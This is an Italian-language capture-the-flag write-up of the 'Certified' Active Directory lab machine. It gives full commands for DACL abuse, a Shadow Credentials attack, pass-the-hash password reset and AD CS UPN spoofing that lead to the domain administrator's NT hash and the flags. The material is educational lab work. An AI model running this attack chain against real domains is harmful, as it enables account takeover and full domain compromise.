+++
date = '2026-07-01T20:21:51+02:00'
draft = false
title = 'Certified Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`01/07/2026`**

![Certified.jpeg](/images/imgs_certified/Certified.jpeg)

---
# Introduzione

**_Certified_** è un ambiente **Active Directory** di livello **Medium**, incentrato sull'exploitation avanzata e sull'abuso dei **Certificate Services** (**AD CS**).

Partendo da un set di credenziali fornite, il percorso di attacco richiede di concatenare l'abuso di diverse configurazioni errate. Iniziando con la manipolazione delle **DACL** per prendere la proprietà di un gruppo, che a sua volta consente di lanciare un attacco **Shadow Credentials** contro un account di servizio. Da lì, ho abusato dei diritti di accesso per resettare la password di un operatore della **Certificate Authority** e ne ho manipolato lo **User Principal Name** (**UPN**). Questo mi ha permesso di sfruttare un template **AD CS** e recuperare l'**hash NT** del Domain **Admin**.

---
# Tecniche Utilizzate
- **Abuso DACL & Modifica dei gruppi**

- **Attacco Shadow Credentials**

- **Reset della password via RPC (Pass-The-Hash)**

- **ADCS Exploitation tramite UPN Spoofing**

---
# Enumerazione

## nmap 

```bash
nmap -sC -sV certified -T5
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-01 23:41:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-01T23:42:36+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-01T23:42:35+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-01T23:42:36+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-01T23:42:35+00:00; +7h00m02s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-01T23:41:58
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
```

---
# Validazione Iniziale & RPC Enumeration

Iniziamo questa macchina con un set di credenziali note:
- **Username**: judith.mader
- **Password**: judith09

Per prima cosa ho convalidato queste credenziali per **WinRM** e **SMB** usando **netexec**. L'accesso tramite **WinRM** è stato negato, mentre l'autenticazione **SMB** ha avuto successo.

```bash
netexec smb certified.htb -u 'judith.mader' -p 'judith09'
```

![nxc_validation.png](/images/imgs_certified/nxc_validation.png)

Successivamente, ho usato **rpcclient** per enumerare gli utenti nel dominio ed estrarne le descrizioni, ottenendo un quadro chiaro dell'ambiente:

```bash
rpcclient -U "certified.htb\judith.mader%judith09" 10.10.11.41 -c "querydispinfo"
```

```text
 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
 Account: judith.mader   Name: Judith Mader      Desc: (null)
 Account: management_svc Name: management service        Desc: (null)
 Account: ca_operator    Name: Operator CA       Desc: (null)
```

Per capire la struttura dei gruppi, ho lanciato un **RID brute-force** tramite **SMB**:

```bash
netexec smb certified.htb -u 'judith.mader' -p 'judith09' --rid-brute
```

![rid-brute.png](/images/imgs_certified/rid-brute.png)

L'enumerazione ha rivelato diversi gruppi e utenti molto interessanti, in particolare il gruppo **`Management`** (**`RID 1104`**), **`management_svc`** (**`RID 1105`**) e **`ca_operator`** (**`RID 1106`**).

---
# Movimento Laterale | Abuso DACL → Shadow Credentials

## Il Gruppo Management

Il mio primo obiettivo era indagare sui gruppi scoperti durante l'enumerazione. Volevo vedere se **`judith.mader`** avesse dei privilegi speciali sul gruppo **Management**.

Invece di affidarmi a **BloodHound**, ho usato **impacket-dacledit** per leggere la **DACL** (**Discretionary Access Control List**) del gruppo direttamente da terminale:

```bash
impacket-dacledit -action 'read' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![dacledit.png](/images/imgs_certified/dacledit.png)

L'output ha rivelato che **`judith.mader`** possedeva il privilegio **`WriteOwner`** sul gruppo **Management**. Questo significava che potevo forzare il cambio di proprietà del gruppo, assegnandolo a me stesso.

Sapendo questo, ho usato **bloodyAD** per sfruttare il privilegio **`WriteOwner`** e impostare **`judith.mader`** come nuovo proprietario del gruppo **Management**:

```bash
bloodyad --host "10.129.231.186" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader 
```

![setowner.png](/images/imgs_certified/setowner.png)

Ora che ero il proprietario del gruppo, avevo l'autorità per modificarne i permessi. Ho usato di nuovo **impacket-dacledit**, questa volta per garantirmi i privilegi di **`WriteMembers`**:

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![writepriv.jpeg](/images/imgs_certified/writepriv.jpeg)

Ottenuti i permessi di scrittura, ho semplicemente aggiunto **`judith.mader`** al gruppo **Management** usando **net rpc**:

```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"
```

Controllando i membri del gruppo ho avuto conferma che sia **`judith.mader`** che **`management_svc`** facevano ora parte del gruppo **Management**.

## Attacco Shadow Credential 

Essendo ora un membro del gruppo **Management**, ne avevo ereditato tutti i permessi. Prima di lanciare exploit alla cieca, volevo vedere esattamente quali privilegi mi garantisse questo gruppo sul prossimo target: l'account di servizio.

Usando nuovamente **impacket-dacledit**, ho letto le **ACL** dell'account **`management_svc`**, filtrando per i diritti posseduti dal gruppo **Management**:

```bash
impacket-dacledit -action 'read' -principal 'Management' -target-dn 'CN=management service,CN=Users,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![dacledit2.jpeg](/images/imgs_certified/dacledit2.jpeg)

L'output ha confermato che il gruppo **Management** deteneva i diritti di **`WriteProperties`** su **`management_svc`**. Questo significava che avevo i permessi specifici necessari per modificare gli attributi sull'account bersaglio.

Ho deciso di sfruttare la cosa con un attacco **Shadow Credentials**. Questa tecnica prevede la scrittura di un nuovo certificato nell'attributo **`msDS-KeyCredentialLink`** dell'oggetto bersaglio, permettendomi di autenticarmi come quell'oggetto tramite **PKINIT**.

Ho usato **pywhisker** per generare e iniettare il certificato:

```bash
pywhisker -d "certified.htb" -u "judith.mader" -p 'judith09' --target "management_svc" --action "add"
```

![pywhisker.png](/images/imgs_certified/pywhisker.png)

Con il certificato ottenuto (**`WErHElee.pfx`**), ho richiesto un **Ticket Granting Ticket** (**TGT**) per **`management_svc`** usando **`gettgtpkinit.py`**:

```bash
python3 PKINITtools/gettgtpkinit.py certified.htb/management_svc -cert-pfx WErHElee.pfx -pfx-pass '<pass>' management_svc.ccache
```

![tgt.png](/images/imgs_certified/tgt.png)

Ho esportato il **TGT** nelle mie variabili d'ambiente e ho usato la chiave di cifratura **AS-REP** per recuperare l'**hash NT** di **`management_svc`**:

```bash
export KRB5CCNAME=management_svc.ccache
python3 PKINITtools/getnthash.py certified.htb/management_svc -key <AS-REP_encryption_key>
```

**Hash NT** recuperato per **`management_svc`**: **a0REDACTED84**

---
# Privilege Escalation | AD CS Exploitation tramite UPN Spoofing

## Reset della Password

Con l'hash di **`management_svc`** a disposizione, il mio bersaglio successivo è stato l'account **`ca_operator`**. Il nome stesso era un indizio enorme, suggerendo fortemente che fosse legato agli **Active Directory Certificate Services** (**AD CS**).

Usando **impacket-dacledit**, ho verificato le **ACL** sull'account **`ca_operator`** per confermare quale tipo di controllo **`management_svc`** avesse effettivamente su di esso:

```bash
impacket-dacledit -action 'read' -principal 'management_svc' -target-dn 'CN=operator ca,CN=Users,DC=certified,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![dacledit3.jpeg](/images/imgs_certified/dacledit3.jpeg)

L'output ha confermato che **`management_svc`** possedeva il **`FullControl`** sull'account **`ca_operator`**. Avere il controllo completo su un oggetto utente include intrinsecamente la capacità di **forzarne il reset della password**.

Sfruttando l'hash compromesso, ho eseguito un attacco **Pass-The-Hash** usando **pth-net rpc** per forzare un reset della password su **`ca_operator`**:

```bash
pth-net rpc password "ca_operator" "Stars1%" -U "certified.htb"/"management_svc"%"a0<REDACTED>84":"a0<REDACTED>84" -S "DC01.certified.htb"
```

![pass-reset.png](/images/imgs_certified/pass-reset.png)

Ho poi verificato le nuove credenziali con **netexec**:

```bash
netexec smb certified.htb -u 'ca_operator' -p 'Stars1%'
```

![nxc_validation2.png](/images/imgs_certified/nxc_validation2.png)

## Manipolazione dell'UPN & Richiesta del Certificato

Ho lanciato **certipy find** e ho scoperto la certificate authority **`certified-DC01-CA`** insieme a un template chiamato **`CertifiedAuthentication`**.

**Nota**: _Di default, **AD CS** usa lo **User Principal Name** (**UPN**) dell'account richiedente per generare il certificato. Se si riesce a cambiare l'**UPN** per farlo combaciare con quello di un utente altamente privilegiato (come l'**Administrator**), la **CA** emetterà un certificato che può essere usato per autenticarsi come quell'utente._

Usando **certipy account update** insieme all'hash di **`management_svc`**, ho sovrascritto il **`userPrincipalName`** di **`ca_operator`** impostandolo ad **Administrator**:

```bash
certipy account update -username management_svc@certified.htb -hashes a0<REDACTED>84 -user ca_operator -upn Administrator
```

![certipy.png](/images/imgs_certified/certipy.png)

Ho verificato la modifica usando **ldapsearch**:

```bash
ldapsearch -x -H ldap://10.10.11.41 -D "judith.mader@certified.htb" -w "judith09" -b "DC=certified,DC=htb" "(sAMAccountName=ca_operator)" userPrincipalName
```

![ldap_validation.jpeg](/images/imgs_certified/ldap_validation.jpeg)

## Privilegi di Domain Admin

Ora che l'**Active Directory** pensava che l'**UPN** di **`ca_operator`** fosse "**Administrator**", ho richiesto un certificato usando il template **`CertifiedAuthentication`**:

```bash
certipy req -username ca_operator@certified.htb -p Stars1% -ca certified-DC01-CA -template CertifiedAuthentication
```

![request.png](/images/imgs_certified/request.png)

Infine, ho usato l'**`administrator.pfx`** generato per autenticarmi tramite **`PKINIT`** e dumpare l'**hash NT** del **Domain Administrator**:

```bash
certipy auth -pfx administrator.pfx -domain certified.htb -user administrator
```

```bash
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d<REDACTED>34
```

Con l'hash dell'**Administrator**, avevo il pieno controllo del dominio.

Passando l'hash tramite **evil-winrm** mi sono connesso alla macchina e ho prelevato sia la **user flag** che quella **root**, compromettendo definitivamente il box.

```bash
evil-winrm -i certified.htb -u Administrator -H '<hash>'
```

```cmd
type C:\Users\management_svc\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

![system&flags.png](/images/imgs_certified/system&flags.png)

---
# Considerazioni Finali

**_Certified_** è una macchina **Active Directory** eccezionale che mette alla prova la comprensione del moderno sfruttamento di **AD** ben oltre i classici flussi di **BloodHound** e **Kerberoasting**.

Il punto di accesso iniziale richiede una solida comprensione delle **DACL** (**Discretionary Access Control Lists**) di **Windows** e di come manipolare la proprietà dei gruppi. Passare da questo a un **attacco Shadow Credentials** usando **pywhisker** simula un lateral movement estremamente realistico.

Per la Privilege Escalation, invece di una generica vulnerabilità **ESC1** dove basta semplicemente fornire un **SAN**, questa macchina costringe a comprendere i meccanismi sottostanti ad **AD CS**. Capire di avere i privilegi necessari per alterare manualmente uno **User Principal Name** (**UPN**) al fine di ingannare la **CA** e farsi rilasciare un certificato da **Domain Admin** è un vettore di attacco molto elegante.

**Sources**:

- **Impacket (DACLedit & PKINIT tools)**: https://github.com/fortra/impacket

- **PyWhisker (Shadow Credentials)**: https://github.com/ShutdownRepo/pywhisker

- **Certipy (AD CS Enumerazione & Sfruttamento)**: https://github.com/ly4k/Certipy

- **Spiegazione Shadow Credentials**: https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab